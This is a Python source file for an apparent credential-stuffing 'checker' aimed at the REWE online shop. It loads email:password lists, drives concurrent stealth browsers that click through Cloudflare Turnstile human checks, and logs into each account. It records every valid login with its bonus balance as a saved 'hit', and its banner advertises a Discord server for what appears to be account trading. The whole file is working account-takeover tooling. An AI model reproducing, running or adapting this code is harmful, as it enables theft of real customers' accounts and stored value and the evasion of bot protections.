import asyncio
import random
import os
import sys
from datetime import datetime
from patchright.async_api import async_playwright
from urllib.parse import urlparse, parse_qs
import requests
from concurrent.futures import ThreadPoolExecutor
import re
import colorama
from colorama import Fore
colorama.init()

# Add a counter for successful accounts
successful_accounts = 0

# Get the directory where the script/executable is located
def get_script_dir():
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        return os.path.dirname(sys.executable)
    else:
        # Running as script
        return os.path.dirname(os.path.abspath(__file__))

# Set the working directory to the script directory
SCRIPT_DIR = get_script_dir()
os.chdir(SCRIPT_DIR)

def load_accounts():
    try:
        accounts_path = os.path.join(SCRIPT_DIR, 'accounts.txt')
        if not os.path.exists(accounts_path):
            print(f"{Fore.RED}Fehler: accounts.txt nicht gefunden im Ordner: {SCRIPT_DIR}{Fore.RESET}")
            sys.exit(1)
            
        accounts = []
        with open(accounts_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(':')
                if len(parts) >= 2:
                    email = parts[0]
                    password = parts[1]
                    accounts.append((email, password))
        return accounts
    except Exception as e:
        print(f"{Fore.RED}Fehler beim Laden der Accounts: {str(e)}{Fore.RESET}")
        sys.exit(1)

def save_result(email, password, balance):
    global successful_accounts
    successful_accounts += 1
    
    results_dir = os.path.join(SCRIPT_DIR, 'results')
    if not os.path.exists(results_dir):
        try:
            os.makedirs(results_dir)
        except Exception as e:
            print(f"{Fore.RED}Fehler beim Erstellen des results Ordners: {str(e)}{Fore.RESET}")
            return
    
    try:
        # Create a new file for each hit with a descriptive name
        filename = os.path.join(results_dir, f'rewe-hit-{email.split("@")[0]}-{balance}€.txt')
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{email}:{password} - {balance}€\n')
    except Exception as e:
        print(f"{Fore.RED}Fehler beim Speichern des Ergebnisses: {str(e)}{Fore.RESET}")

async def process_account(email, password):
    try:
        async with async_playwright() as p:
            browser_args = {
                "headless": False,
                "channel": "chrome",
                "args": [
                    "--disable-gpu",
                    "--disable-dev-shm-usage",
                    "--no-sandbox",
                    "--disable-setuid-sandbox"
                ]
            }
            
            browser = await p.chromium.launch(**browser_args)
            page = await browser.new_page()

            try:
                print(f"{Fore.CYAN}Verarbeite Account: {email}{Fore.RESET}")
                await page.goto("https://shop.rewe.de/mydata/login", timeout=30000)
                
                # Handle Cloudflare turnstile
                for _ in range(10):
                    try:
                        await page.wait_for_selector('//h1[contains(text(), "Zeig uns, dass du ein Mensch bist.")]', timeout=1500)
                        await page.wait_for_selector("//input[@name='cf-turnstile-response']/..", state="attached")
                        await page.eval_on_selector("//input[@name='cf-turnstile-response']/..", "el => el.style.width = '70px'")
                        await page.locator("//input[@name='cf-turnstile-response']/..").click(timeout=1000)
                        await asyncio.sleep(1)
                    except:
                        break

                # Handle cookie consent - multiple attempts with different selectors
                cookie_consent_handled = False
                for _ in range(5):
                    try:
                        # Try different cookie consent button selectors
                        selectors = [
                            'button[data-testid="uc-accept-all-button"]',
                            'button[data-testid="uc-accept-all-button"]:not([disabled])',
                            'button[data-testid="uc-accept-all-button"]:not([aria-disabled="true"])',
                            'button[data-testid="uc-accept-all-button"]:not([aria-disabled="true"]):not([disabled])',
                            'button[data-testid="uc-accept-all-button"]:not([disabled]):not([aria-disabled="true"])'
                        ]
                        
                        for selector in selectors:
                            try:
                                await page.wait_for_selector(selector, timeout=1000)
                                button = await page.query_selector(selector)
                                if button:
                                    is_visible = await button.is_visible()
                                    is_enabled = await button.is_enabled()
                                    if is_visible and is_enabled:
                                        await button.click(timeout=1000)
                                        cookie_consent_handled = True
                                        print(f"{Fore.GREEN}Cookie consent accepted{Fore.RESET}")
                                        break
                            except:
                                continue
                        
                        if cookie_consent_handled:
                            break
                            
                        await asyncio.sleep(0.5)
                    except:
                        pass

                # Wait for and fill the username field
                await page.wait_for_selector('input[name="username"]', timeout=3000)
                await page.locator('input[name="username"]').fill(email)
                
                # Wait for and fill the password field
                await page.wait_for_selector('input[name="password"]', timeout=3000)
                await page.locator('input[name="password"]').fill(password)

                # Handle Cloudflare turnstile again if needed
                for _ in range(10):
                    try:
                        turnstile_check = await page.input_value("[name=cf-turnstile-response]", timeout=1000)
                        if turnstile_check == "":
                            await page.eval_on_selector("//div[@id='cf-turnstile']", "el => el.style.width = '70px'")
                            await page.locator("//div[@id='cf-turnstile']").click(timeout=700)
                            await asyncio.sleep(0.6)
                        else:
                            break
                    except:
                        pass

                # Wait for the login button to be enabled
                try:
                    await page.wait_for_selector('button[type="submit"]:not([disabled])', timeout=3000)
                    await page.click('button[type="submit"]')
                except Exception as e:
                    print(f"{Fore.RED}Login button not enabled: {str(e)}{Fore.RESET}")
                    return "invalid"

                await asyncio.sleep(5)

                try:
                    await page.wait_for_url("https://shop.rewe.de/?loggedIn=1", timeout=300)
                    
                    await page.goto("https://shop.rewe.de/bonus?filter=assigned", timeout=30000)
                    await asyncio.sleep(2)
                    
                    try:
                        await page.wait_for_selector(".rewe-bonus-ecom-app_activationContainer__KeFTv", timeout=2000)
                        
                        html_content = await page.content()
                        
                        balance_match = re.search(r'<div class="activation-teaser_balanceContainer__JHHyp">.*?<h1>(.*?)</h1>', html_content, re.DOTALL)
                        
                        if balance_match:
                            balance_text = balance_match.group(1).strip()
                            balance = balance_text.replace('€', '').strip().replace(',', '.')
                            balance = float(balance)
                            print(f"{Fore.GREEN}✅ Account {email} ist gültig - Guthaben: {balance}€{Fore.RESET}")
                            save_result(email, password, balance)
                        else:
                            print(f"{Fore.GREEN}✅ Account {email} ist gültig - Kein Bonus-Guthaben{Fore.RESET}")
                            save_result(email, password, "0.00")
                            
                    except Exception as e:
                        print(f"{Fore.GREEN}✅ Account {email} ist gültig - Guthaben konnte nicht abgerufen werden{Fore.RESET}")
                        save_result(email, password, "0.00")
                    
                    return "valid"
                except:
                    try:
                        await page.wait_for_selector("//span[contains(text(), 'E-Mail-Adresse oder Passwort falsch.')]", timeout=500)
                        print(f"{Fore.RED}❌ Account {email} ist ungültig (falsche Anmeldedaten){Fore.RESET}")
                        await asyncio.sleep(0.2)
                        return "invalid"
                    except:
                        pass

                    try:
                        await page.wait_for_selector("//h2[contains(text(), 'Bestätige deine E-Mail-Adresse')]", timeout=500)
                        print(f"{Fore.RED}❌ Account {email} ist ungültig (E-Mail-Verifizierung erforderlich){Fore.RESET}")
                        await asyncio.sleep(0.2)
                        return "invalid"
                    except:
                        pass

                    print(f"{Fore.RED}❌ Account {email} ist ungültig (Login nicht bestätigt){Fore.RESET}")
                    await asyncio.sleep(0.2)
                    return "invalid"

            finally:
                await browser.close()
                
    except Exception as e:
        print(f"{Fore.RED}❌ Fehler bei Account {email}: {str(e)}{Fore.RESET}")
        return "invalid"

async def process_accounts(accounts, max_concurrent):
    semaphore = asyncio.Semaphore(max_concurrent)
    account_queue = asyncio.Queue()
    
    for email, password in accounts:
        await account_queue.put((email, password))
    
    async def worker():
        while True:
            try:
                email, password = await account_queue.get()
                
                async with semaphore:
                    await process_account(email, password)
                
                account_queue.task_done()
            except asyncio.QueueEmpty:
                break
    
    workers = [asyncio.create_task(worker()) for _ in range(max_concurrent)]
    
    await asyncio.gather(*workers)

async def main():
    print(f"{Fore.CYAN}Arbeitsverzeichnis: {SCRIPT_DIR}{Fore.RESET}")
    
    while True:
        try:
            thread_count = int(input(f"{Fore.CYAN}Anzahl der Threads eingeben: {Fore.RESET}"))
            if thread_count >= 1:
                break
            print(f"{Fore.RED}Bitte eine Zahl größer als 0 eingeben{Fore.RESET}")
        except ValueError:
            print(f"{Fore.RED}Bitte eine gültige Zahl eingeben{Fore.RESET}")
    
    accounts = load_accounts()
    print(f"{Fore.GREEN}Geladene Accounts: {len(accounts)}{Fore.RESET}")
    
    await process_accounts(accounts, thread_count)

if __name__ == "__main__":
    ascii_art = (
        f"{Fore.RED}"
        "\n"
        " ██▀███  ▓█████  █     █░▓█████     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  \n"
        "▓██ ▒ ██▒▓█   ▀ ▓█░ █ ░█░▓█   ▀    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒\n"
        "▓██ ░▄█ ▒▒███   ▒█░ █ ░█ ▒███      ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒\n"
        "▒██▀▀█▄  ▒▓█  ▄ ░█░ █ ░█ ▒▓█  ▄    ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  \n"
        "░██▓ ▒██▒░▒████▒░░██▒██▓ ░▒████▒   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒\n"
        "░ ▒▓ ░▒▓░░░ ▒░ ░░ ▓░▒ ▒  ░░ ▒░ ░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░\n"
        "  ░▒ ░ ▒░ ░ ░  ░  ▒ ░ ░   ░ ░  ░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░\n"
        "  ░░   ░    ░     ░   ░     ░      ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ \n"
        "   ░        ░  ░    ░       ░  ░   ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     \n"
        "                                   ░                       ░                                "
        f"{Fore.RESET}"
    )
    print(ascii_art)
    print(f"{Fore.RED}                  https://discord.gg/majesticexch- by limekanacke{Fore.RESET}")
    while True:
        print(f"{Fore.RED}1. Starten\n2. Exit{Fore.RESET}")
        choice = input(f"{Fore.RED}Bitte wähle eine Option (1/2): {Fore.RESET}")
        if choice == "1":
            break
        elif choice == "2":
            print(f"{Fore.RED}Beendet.{Fore.RESET}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}Ungültige Eingabe. Bitte 1 oder 2 wählen.{Fore.RESET}")
    asyncio.run(main()) 
